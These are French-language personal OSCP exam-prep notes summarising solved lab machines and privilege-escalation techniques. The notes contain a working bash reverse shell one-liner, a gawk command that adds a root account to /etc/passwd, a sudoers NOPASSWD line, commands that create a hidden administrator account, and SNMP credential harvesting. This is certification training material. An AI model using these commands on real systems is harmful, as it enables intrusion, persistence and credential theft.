# OSCP Notes – Cheatsheet & Retex

---

# 🧠 Challenges Résolus

## OSCP B

### Kiero
- Credentials: `kiero / kiero`
- SSH key fournie
- PrivEsc: **Dirty Pipe**

---

### Berlin
- Vulnérabilité: **Text4Shell**
- Trouvée via changelog pendant l’énumération
- Reverse shell via `msfvenom` dans `/tmp`
- ⚠️ Problème:
  - `wget http://IP` ne fonctionnait pas → utiliser `wget IP`

**PrivEsc:**
- Service Java sur port `8000` (JDWP) lancé en root
- Exploit existant → version à adapter (bug Python `socket.connect/send`)
- Utilisation de **Ligolo**
  - Accès localhost via tunnel
  - Adresse: `240.0.0.1`
  - Ne pas oublier d’ajouter la route

---

### Gust
- Vulnérabilité: **FreeSwitch (Metasploit)**
- Droits: `SeImpersonate`

❌ Échecs:
- `getsystem`
- SweetPotato
- GodPotato (reverse shell)

✅ Solution:
```powershell
.\gpnet4.exe -cmd "net user seba password /add"
.\gpnet4.exe -cmd "net localgroup administrators seba /add"
```

---

## OSCP C

### MS01
- Fichier caché dans profil `eric.wallows`
- Retourne hash MD5 du vrai mot de passe

---

### MS02
- Mot de passe trouvé dans:
```powershell
powershell history (AppData)
```

---

### DC01
- Présence de `C:\Windows.old`
- Dump SAM + SYSTEM
- `mimikatz` fonctionnait aussi

---

### Frankfurt
- Vulnérabilité: **Vesta Control Panel**
- https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/

Credentials via SNMP:
```bash
snmpbulkwalk -v2c -c public 192.168.134.156 -Oa 1 | grep -i pass
```

⚠️ Important:
- Option `-Oa 1` critique

Reverse shell:
- Dépend du package:
  - `netcat-openbsd-1.187-1ubuntu0.1`
- Source: rvshells.com

---

### Charlie

Foothold:
- Exploit Miniserv / Usermin
- Credentials:
  - login via metadata PDF
  - mdp = login

PrivEsc:
- Cron détecté via:
```bash
pspy64
```

Commande:
```bash
tar -zxf backup *
```

Exploit wildcard:
- Injection via noms de fichiers
- Exécution root

Ref:
https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

---

### Pascha
- Foothold: Mobile Mouse Server (Metasploit)
- Changer port `8080 → 80`

PrivEsc:
- Remplacement binaire service

Détection:
```powershell
Invoke-AllChecks
```

Résultat:
```
C:\Program Files\MilleGPG5\GPGService.exe BUILTIN\Users:(R)
                                              BUILTIN\Users:(I)(M)
```

---

### Relia

#### WEB01
- Vuln: Apache 2.4.49 (Path Traversal)
- Clé SSH trouvée (Anita)
- Passphrase crackée via John

PrivEsc:
- `sudo 1.8.31` vulnérable
- https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

---

#### DEMO
- Foothold via SSH key
- Vuln: LFI

Exploit:
- Drop reverse shell dans:
```bash
/dev/shm
```

⚠️ Seuls certains payloads fonctionnent

PrivEsc:
- Apache avec droits sudo

---

#### EXTERNAL
- SMB writable: `transfer`

Exploit:
- Reverse shell `.aspx`

PrivEsc:
- `SeImpersonate`
- Présence:
  - fichier KeePass (.kbx)
  - variable environnement

---

#### LEGACY
- Vuln: RiteCMS upload `.php`
- PrivEsc: `SeImpersonate`

---

#### WEB02
- FTP caché: port `14080`
- CMS Umbraco: port `14020`
- Credentials dans PDF
- Exploit Umbraco 7 (exploit-db)

---

#### ROOT-ME > REALISTE > MATRIX TERMINAL (complete wrapup sur leur site, ou le mien sur Kaka)
- Port scanning
- guest to dev : SQL injection union based in the shop script
- dev to manager : Retrieve manager’s password with password_memo stored function
- manager to tester : Get tester’s password with FILE priv
- tester to admin : SQL injection union based in stored procedure
- admin to spradmin : Leak spradmin’s password in password_memo stored procedure founded in mysql.proc table
- Exploit LOAD DATA LOCAL capabilitie flag in API endpoint’s SQL connection -> je choppe la clé SSH privée de NEO. Pour cela, j'ai fait développé à ChatGPT un serveur MySQl Rogue en Python pour exploiter la capabilité LOAD DATA LOCAL
- Final Privesc via  raptor_udf2.so library to exploit MySQL ruunning as root (plugin dans le répertoire MariaDb prévu à cet effet, qui avait des droits pour mon utilisateur  à vrai dire j'avais mis un plugin plus simple conçu par l'IA).

---
# 🔧 Techniques & Tips

## Dirty Pipe

- Kernel type:
```bash
uname -r
```

⚠️ Attention:
- Certaines versions patchées
- Exemple vulnérable:
```
5.15.0-051500rc7-generic
```

Solution testée:
- Revert kernel vers `5.8.0`

Exploit:
https://www.exploit-db.com/exploits/50808

---

## SUID Exploit (gawk)

```bash
LFILE=/etc/passwd
gawk -v LFILE=$LFILE 'BEGIN { print "new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" >> LFILE }'
su new
```

---

## Reverse Shell

```bash
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'
```

---

## Sudo Write Trick

Si écriture autorisée:
```bash
/etc/sudoers.d/
```

Ajouter:
```
user ALL=(ALL:ALL) NOPASSWD: ALL
```

---

## MySQL / MSSQL Shell

https://michmich.eu/Cheatsheets/useful-commands/shell/

---

## SeImpersonatePrivilege

- Fréquent sur:
  - services web
  - bases de données

➡️ mène souvent à `NT AUTHORITY\SYSTEM`

---

# 🌐 Web Enumeration

Wordlist:
```
/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
```

À tester:
- `robots.txt`
- `sitemap.xml`

---

# 📚 Ressources

## OSCP / Retex
- https://warranty-v01d.pages.dev/posts/how-i-passed-the-oscp/
- https://wiki.vulnlab.com/intro/recommendations
- https://narekkay.fr/posts/oscp-retex-narekkay/

---

## Writeups
- https://publish.obsidian.md/d4rkc0de/writeup-all/htb/ad/htb-ad-4-sauna

---

## CheatSheets

### SQLi
- https://tib3rius.com/sqli

### Exploits
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/ycdxsb/WindowsPrivilegeEscalation
- https://github.com/MzHmO/Exploit-Street

### Général
- https://wadcoms.github.io/
- https://0xsp.com/offensive/privilege-escalation-cheatsheet/
- https://notes.sfoffo.com/

---

## Active Directory

- https://github.com/lutzenfried/Methodology
- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

### Kerberos
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

---

# 🧪 Exam Tips

## Méthodologie

- Ne jamais arrêter l’énumération
- Toujours prendre des notes
- Scanner UDP aussi
- Tester plusieurs wordlists

---

## Bonnes pratiques

- Ajouter FQDN dans `/etc/hosts`
- Vérifier credentials par défaut
- Tester plusieurs outils extraction ZIP
- Revenir en arrière si nécessaire

---

## Reporting

- Screenshots nommés proprement:
  - `Admin Panel`
  - `Cracked Zip`
  - etc.

- Numéroter après l’examen

- Template:
https://help.offsec.com/hc/en-us/articles/4547917816468-OffSec-OSCP-Exam-with-AD-Preparation-Newly-Updated

---

## VM & Backup

- Snapshots réguliers
- Sauvegarde avant chaque box

---

## Windows Quick Checks

- Root directory
- Desktop / Documents
- Program Files (x86)
- PowerShell history

---

# 🛠️ Tools à préparer

- WinPEAS
- LinPEAS
- SharpHound
- mimikatz
- PsExec
- Ligolo

---

# ⚙️ Setup Kali

## Packages

```bash
sudo apt update && sudo apt install -y bloodhound seclists ncat
```

---

## Aliases

```bash
alias runeth="sudo dhclient -r eth0 && sudo dhclient eth0"
alias runwww="python3 -m http.server"
alias tun0='ip a sh dev tun0 | grep -oP "(?:[0-9]{1,3}\.){3}[0-9]{1,3}" | tr -d "\n" | xclip -sel c'
```

---

# 🧠 Divers

## Python fixes

- https://stackoverflow.com/questions/34249188/oserror-errno-107-transport-endpoint-is-not-connected
- https://hackernoon.com/resolving-typeerror-a-bytes-like-object-is-required-not-str-in-python

---

## AD Exam

- Bien lire les structures AD
- https://help.offsec.com/hc/en-us/articles/4547917816468-OffSec-OSCP-Exam-with-AD-Preparation-Newly-Updated

---

## Rappels

- Lire ses notes avant examen
- Toujours garder creds importants
- Préparer environnement

---

# 🧾 Terminal Tips

## Terminator Scroll

- Augmenter scrollback
- Utiliser `tmux` ou `screen`

```bash
tmux
Ctrl + b puis [
```

---

# 🔚 Conclusion

- Enum > Exploit > PrivEsc
- Toujours croiser les infos
- Toujours documenter

---

**Payloads:**  
👉 https://github.com/swisskyrepo/PayloadsAllTheThings
